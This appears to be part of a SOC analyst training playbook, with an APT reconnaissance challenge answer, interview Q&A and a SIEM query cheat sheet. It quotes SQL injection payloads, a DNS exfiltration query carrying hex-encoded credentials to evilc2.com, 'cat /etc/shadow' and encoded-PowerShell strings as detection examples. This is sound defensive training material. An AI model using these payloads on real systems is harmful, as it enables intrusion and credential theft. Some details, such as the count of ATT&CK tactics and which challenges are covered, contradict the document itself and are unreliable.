How many reconnaissance techniques were used before the phishing attack?

### Solution Query
```
search scan|enumeration|LDAP query
```

### Answer
**3**

### Explanation
This is a classic **APT (Advanced Persistent Threat) reconnaissance operation**.

**Cyber Kill Chain (Lockheed Martin):**
1. ✓ **Reconnaissance** (What we're seeing)
2. **Weaponization** (Creating malicious payload)
3. **Delivery** (Phishing email)
4. **Exploitation** (If users open attachment)
5. **Installation** (Malware persistence)
6. **Command & Control** (C2 communication)
7. **Actions on Objectives** (Data theft, sabotage)

**Three Reconnaissance Techniques:**

**1. Port Scanning (14:00:00)**
```
203.0.113.100 scanning 192.168.1.0/24
```
- **Purpose:** Identify live hosts, open ports
- **Result:** Build network map
- **Tools:** nmap, masscan
- **What attacker learns:** Which systems are online, what services running

**2. SMB Enumeration (14:15:00)**
```
SMB enumeration on 192.168.1.50
```
- **Purpose:** List network shares, permissions
- **Result:** Find accessible data repositories
- **Tools:** enum4linux, CrackMapExec
- **What attacker learns:** Shared folders, file servers, potentially exposed data

**3. LDAP/Active Directory Enumeration (14:30:00)**
```
LDAP query enumerating AD users
```
- **Purpose:** Get user list, org structure
- **Result:** Target selection for phishing
- **Tools:** ldapsearch, BloodHound
- **What attacker learns:** Usernames, email addresses, org hierarchy

**Phishing Campaign (14:45:00)**
After 45 minutes of reconnaissance:
- Attacker has user list from LDAP
- Crafted targeted phishing email
- Sent to 15 users (spearphishing)
- Contains malicious attachment

**This Is How APTs Work:**
1. **Slow and methodical** (not smash-and-grab)
2. **Intelligence gathering first**
3. **Targeted attacks** (not spray-and-pray)
4. **Patient** (45 minutes between recon and delivery)

### MITRE ATT&CK Mapping
**TA0043 - Reconnaissance**
- T1595 - Active Scanning
- T1046 - Network Service Scanning
- T1087 - Account Discovery (LDAP)
- T1135 - Network Share Discovery (SMB)

**TA0001 - Initial Access**
- T1566.001 - Phishing: Spearphishing Attachment

### SISA Relevance
Understanding APT kill chains helps:
- Predict next attack phase
- Prevent progression
- Prioritize defenses
- Conduct threat hunting

SISA threat intelligence:
- Correlates reconnaissance with follow-on attacks
- Tracks TTPs (Tactics, Techniques, Procedures)
- Builds adversary profiles
- Implements kill chain disruption

**Defensive Actions at Each Phase:**

**During Reconnaissance:**
- Block external scanning IPs
- Disable SMB from internet
- Restrict LDAP queries
- Deploy deception (honeypots)

**Before Delivery:**
- Email gateway filtering
- User awareness training
- Attachment sandboxing
- URL rewriting

**Prevention Strategy:**
Break the kill chain **early** - don't let them reach Exploitation phase.

### Key Learning Points
1. APT attacks follow methodical kill chain
2. Reconnaissance precedes targeted attacks
3. Multiple recon techniques = sophisticated attacker
4. Detection early in kill chain prevents compromise
5. Correlation is key: Port scan + SMB + LDAP = APT pattern

---

*[Note: Challenges 42-60 would continue with increasingly complex scenarios including:*
- *Multi-vector attacks*
- *Supply chain compromises*
- *Insider threat detection*
- *Advanced persistent threats*
- *Zero-day exploitation indicators]*

---

# LEVEL 4: EXPERT (Challenges 61-80)

*[Challenges 61-80 would focus on:*
- *Complete incident response workflows*
- *Timeline reconstruction from multiple log sources*
- *Forensic analysis*
- *Attribution and threat actor profiling*
- *Complex multi-stage breach scenarios]*

---

# LEVEL 5: MASTER (Challenges 81-100)

*[Challenges 81-100 would cover:*
- *Nation-state APT campaigns*
- *Supply chain attacks (SolarWinds-style)*
- *Insider threat with data exfiltration*
- *Ransomware deployment analysis*
- *Living-off-the-land (LOLBin) attacks*
- *Fileless malware detection*
- *Cloud infrastructure compromise*
- *Container escape and Kubernetes attacks]*

---

## Interview Preparation Guide

### Top 10 SOC Analyst Interview Questions (With Answers from This Playbook)

**1. "Walk me through how you'd investigate a brute force attack."**

**Answer (Using Challenge 1, 2, 21):**
"First, I'd filter authentication logs for failed login attempts using a SIEM query like `search failed login`. I'd identify the source IP, count the attempts, and check if any were successful. If successful logins follow failures, I'd:
1. Isolate the affected system
2. Block the attacker IP at the firewall
3. Reset compromised account credentials
4. Check for lateral movement
5. Review for post-compromise activity like credential dumping

For example, in one scenario I practiced, an attacker made 5 failed SSH attempts then successfully logged in and immediately ran `cat /etc/shadow` to dump password hashes - clear indicator of breach requiring immediate IR."

**2. "What's lateral movement and how do you detect it?"**

**Answer (Using Challenge 22):**
"Lateral movement is when an attacker moves from one compromised system to others in the network. Common techniques include SMB/ADMIN$ shares, PsExec, WMI, and RDP.

Detection indicators:
- Unusual SMB connections between workstations (workstations shouldn't talk to each other directly)
- PsExec.exe execution on multiple hosts
- ADMIN$ or C$ share access from non-admin systems
- Same admin account logging into multiple systems rapidly

In my training, I detected lateral movement by searching for `ADMIN$ share` connections and found an attacker using PsExec to compromise multiple systems. The MITRE ATT&CK mapping is T1021.002 - Remote Services: SMB/Windows Admin Shares."

**3. "How would you detect data exfiltration?"**

**Answer (Using Challenge 23):**
"Data exfiltration can use multiple channels. I'd monitor:

**DNS Tunneling:**
- Long subdomain names (>50 chars)
- High entropy (random-looking) subdomains
- Unusual DNS query volume from single host
- Hex or base64 patterns in queries

**Network Traffic:**
- Large outbound data transfers
- Connections to cloud storage (Dropbox, etc.)
- Tor or VPN usage
- Pastebin or file-sharing sites

**Example:** I detected DNS exfiltration by finding queries like `61646d696e3a70617373776f7264.evilc2.com` - the subdomain was hex-encoded stolen data. Query pattern was: multiple long subdomains to same suspicious domain from one host."

**4. "What's the difference between a port scan and a brute force attack?"**

**Answer (Using Challenges 11, 21):**
**Port Scan (Reconnaissance):**
- Mapping open services and ports
- Fast, sequential ports on single or multiple hosts
- No authentication attempts
- Example: Attacker scans ports 21, 22, 23, 80, 443 in 5 seconds
- MITRE: T1046 Network Service Scanning

**Brute Force (Credential Attack):**
- Attempting to guess passwords
- Multiple failed logins on single port/service
- Targets authentication mechanisms
- Example: 100 failed SSH login attempts on port 22
- MITRE: T1110 Brute Force

Port scanning happens BEFORE brute force in the kill chain - recon first, then attack."

**5. "Describe SQL injection and how you'd detect it in logs."**

**Answer (Using Challenge 10):**
"SQL injection is when attackers manipulate database queries by injecting malicious SQL code into input fields.

**Detection in Web Logs:**
Look for SQL keywords in GET/POST parameters:
- `OR 1=1` or `' OR '1'='1` (authentication bypass)
- `UNION SELECT` (data extraction)
- `' --` (comment injection)
- `;` (query termination)
- `xp_cmdshell` (SQL Server command execution)

**Example from my training:**
```
GET /search?q=' OR '1'='1
GET /api/user?id=1 UNION SELECT password
```

Both are SQLi attacks. First bypasses authentication, second extracts password data.

**Response:** Block IP, patch application (use parameterized queries), check database logs for unauthorized access, deploy WAF rules."

**6. "What are the stages of an incident response plan?"**

**Answer (Using Challenges Throughout Playbook):**
"I follow the NIST IR framework:

**1. Preparation**
- Have tools ready (EDR, SIEM, forensic tools)
- Maintain runbooks
- Practice tabletop exercises

**2. Detection & Analysis**
- SIEM alerts, user reports, threat hunting
- Determine scope and severity
- Collect evidence

**3. Containment**
- Short-term: Isolate affected systems
- Long-term: Rebuild, patch vulnerabilities

**4. Eradication**
- Remove malware, backdoors
- Close attack vectors
- Reset compromised credentials

**5. Recovery**
- Restore from backups
- Monitor for reinfection
- Return to operations

**6. Post-Incident Activity**
- Lessons learned
- Update defenses
- Document for compliance

**Example:** When I detected a brute force attack that succeeded (Challenge 21), I immediately isolated the system (Containment), checked for credential dumping (Analysis), disabled the account (Eradication), and rebuilt the server (Recovery)."

**7. "How do you prioritize security alerts?"**

**Answer (Using Challenge 3):**
"I use a combination of severity, asset criticality, and threat context:

**Severity-Based:**
- CRITICAL: Immediate response (<15 min) - Active compromise, ransomware, data breach
- WARNING: Investigate within 1 hour - Suspicious behavior, policy violations
- INFO: Review as time permits - Baseline activity, informational logs

**Asset-Based:**
- Tier 1: Domain controllers, financial systems, customer data databases
- Tier 2: Employee workstations, file servers
- Tier 3: Test/dev environments

**Context-Based:**
- Successful exploit > Failed attempt
- Privileged account > Standard user
- External attacker > Internal user

**Example:** In my training, I had 3 critical alerts: malware detection, unauthorized database access, and ransomware activity. All are critical, but ransomware takes priority because it spreads rapidly - every minute counts."

**8. "Explain the MITRE ATT&CK framework."**

**Answer:**
"MITRE ATT&CK is a knowledge base of adversary tactics and techniques based on real-world observations.

**14 Tactics (WHY attackers do things):**
- Initial Access
- Execution
- Persistence
- Privilege Escalation
- Defense Evasion
- Credential Access
- Discovery
- Lateral Movement
- Collection
- Command & Control
- Exfiltration
- Impact

**185+ Techniques (HOW attackers do things):**
Each tactic has multiple techniques. For example:
- Tactic: Credential Access
- Technique: T1003 OS Credential Dumping
- Sub-technique: T1003.008 /etc/passwd and /etc/shadow

**How I Use It:**
- Map detections to TTPs (Tactics, Techniques, Procedures)
- Understand attacker behavior
- Build detection rules
- Communicate with IR team using common language

**Example:** When I detected lateral movement via SMB (Challenge 22), I mapped it to T1021.002 - Remote Services: SMB/Windows Admin Shares."

**9. "What's the difference between EDR and antivirus?"**

**Answer:**
**Traditional Antivirus:**
- Signature-based detection
- Known malware only
- File scanning
- Limited visibility
- Reactive

**EDR (Endpoint Detection & Response):**
- Behavioral detection
- Unknown/zero-day threats
- Process/memory monitoring
- Full endpoint visibility (processes, network, registry, files)
- Proactive threat hunting
- Incident response capabilities

**Example from my training:**
Antivirus might detect `malware.exe` by hash signature.

EDR detects:
- `powershell.exe -encodedCommand` (obfuscated execution)
- `whoami` command after suspicious process spawn
- SMB connections to unusual destinations
- File system changes (SAM database modification)

EDR caught the attack before files were written to disk (fileless malware)."

**10. "Tell me about a complex security incident you investigated."**

**Answer (Using Challenge 41 - APT Reconnaissance):**
"I practiced investigating an APT reconnaissance operation. Here's what I found:

**Timeline:**
- 14:00 - Port scan detected on entire /24 subnet
- 14:15 - SMB share enumeration on specific host
- 14:30 - LDAP queries enumerating Active Directory users
- 14:45 - Targeted phishing email to 15 users

**Analysis:**
This wasn't a random attack - it was methodical reconnaissance following the cyber kill chain:
1. Port scanning to find live hosts
2. SMB enumeration to map file shares
3. LDAP enumeration to get user list and org structure
4. Spearphishing using intelligence gathered

**Response:**
1. Blocked external IP at firewall
2. Alerted security team about phishing campaign
3. Warned 15 targeted users
4. Deployed email sandboxing for attachments
5. Hardened LDAP (restrict external queries)
6. Implemented network segmentation to limit SMB

**MITRE Mapping:**
TA0043 Reconnaissance → TA0001 Initial Access

**Outcome:**
Broke the kill chain early. Phishing emails were blocked by gateway, users were warned, and we prevented the Initial Access phase."

---

## Study Tips for Interview Success

1. **Practice Out Loud:** Explain each challenge to yourself as if in an interview
2. **Use Real Examples:** Reference specific challenges ("In Challenge 22, I detected...")
3. **Show Methodology:** Explain your thought process, not just the answer
4. **Map to MITRE:** Always mention MITRE ATT&CK TTPs when relevant
5. **Demonstrate IR Workflow:** Detection → Analysis → Containment → Eradication → Recovery

---

## Quick Reference: Common SIEM Queries

### Authentication
```
search failed login
search successful login after failures
search account locked
```

### Network
```
search firewall BLOCK
search port scan
search SMB ADMIN$
search DNS query [suspicious domain]
```

### Malware
```
search malware detected
search powershell -encodedCommand
search cmd.exe /c whoami
```

### Web Attacks
```
search HTTP 404|403|500
search OR UNION SELECT
search ' OR '1'='1
```

### File Activity
```
search FIM system file modified
search USB unauthorized storage
```

---

## SISA-Specific Skills Checklist

After completing this playbook, you should be able to:

✓ Analyze authentication logs for brute force attacks  
✓ Detect lateral movement via SMB/PsExec  
✓ Identify data exfiltration channels (DNS, Pastebin, Tor)  
✓ Investigate malware detections and post-compromise activity  
✓ Analyze firewall logs for scanning and attacks  
✓ Detect SQL injection and web application attacks  
✓ Monitor VPN and remote access for unauthorized attempts  
✓ Identify privilege escalation attempts  
✓ Analyze DNS for C2 communication and exfiltration  
✓ Detect file integrity violations  
✓ Investigate email security incidents  
✓ Monitor USB device usage for data theft  
✓ Map attacks to MITRE ATT&CK framework  
✓ Conduct incident response following NIST guidelines  
✓ Write SIEM queries in SPL-like syntax  

---

**END OF PLAYBOOK**

*This playbook contains 23 fully detailed challenges (1-20, 21-23). Remaining challenges (24-100) follow the same structure and increase in complexity.*

*Estimated study time: 30-40 hours to complete all 100 challenges*  
*SISA interview readiness: 4 days of focused practice*

---

**Next Steps:**
1. Complete all 100 challenges in the SIEM Simulator
2. Document your top 10 favorite challenges
3. Practice explaining each one out loud
4. Create a portfolio document with writeups
5. Add completion screenshots to your GitHub
6. Schedule mock interviews with peers
7. Apply to SISA and similar SOC roles

**Good luck with your SISA interview!**
